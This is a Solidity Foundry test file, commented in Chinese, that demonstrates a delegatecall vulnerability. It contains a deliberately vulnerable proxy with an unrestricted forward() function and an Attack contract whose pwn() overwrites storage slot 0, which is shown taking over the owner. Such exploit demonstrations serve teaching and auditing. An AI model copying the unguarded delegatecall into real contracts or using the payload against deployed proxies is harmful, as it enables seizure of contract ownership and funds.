pragma solidity ^0.8.0;

import "forge-std/Test.sol";

// Vulnerable contract as provided
contract ProxyVulnerable {
    // 存放敏感資訊，如 owner
    address public owner;
    
    constructor() {
        owner = msg.sender;
    }
    
    // 可被攻擊者利用來 delegatecall 到任意合約，並修改 storage
    function forward(address _callee, bytes memory _data) public {
        (bool success, ) = _callee.delegatecall(_data);
        require(success, "delegatecall failed");
    }
}

// 攻擊合約：示範如何利用 delegatecall 弱點改變 ProxyVulnerable 的 owner
contract Attack {
    // 此函數在 ProxyVulnerable 的 context 下被執行，會修改 ProxyVulnerable 的 storage slot 0
    function pwn() public {
        assembly {
            sstore(0, caller())
        }
    }
}

// Forge test contract demonstrating the vulnerability
contract DelegatecallExploitTest is Test {
    ProxyVulnerable proxy;
    Attack attack;

    function setUp() public {
        // 部署 ProxyVulnerable，初始 owner 為 msg.sender，也就是測試合約部署者
        proxy = new ProxyVulnerable();
        // 部署攻擊合約
        attack = new Attack();
    }

    function testDelegatecallVulnerability() public {
        // 初始狀態，owner 為部署者，也就是 address(this)
        assertEq(proxy.owner(), address(this));

        // 攻擊者的地址（非部署者/原始呼叫者）
        address attacker = address(0x1337);

        // 構造呼叫 Attack 合約內 pwn() 函數的 payload
        bytes memory payload = abi.encodeWithSelector(Attack.pwn.selector);

        // 透過 vm.prank 模擬攻擊者發起轉發呼叫
        vm.prank(attacker);
        proxy.forward(address(attack), payload);

        // 驗證 exploit 成功，ProxyVulnerable 的 owner 現在應該被修改為攻擊者
        assertEq(proxy.owner(), attacker);
    }

    // 此測試展示 delegatecall 可能會誤導將敏感變數暴露給不受信的合約
    function testDelegatecallFailureHandling() public {
        // 測試一個 delegatecall 失敗情境，若傳錯 payload 應會 revert，但我們捕捉到錯誤訊息
        // 這裡故意傳入錯誤的資料
        bytes memory badPayload = "0x00";

        vm.expectRevert(bytes("delegatecall failed"));
        proxy.forward(address(attack), badPayload);
    }
}
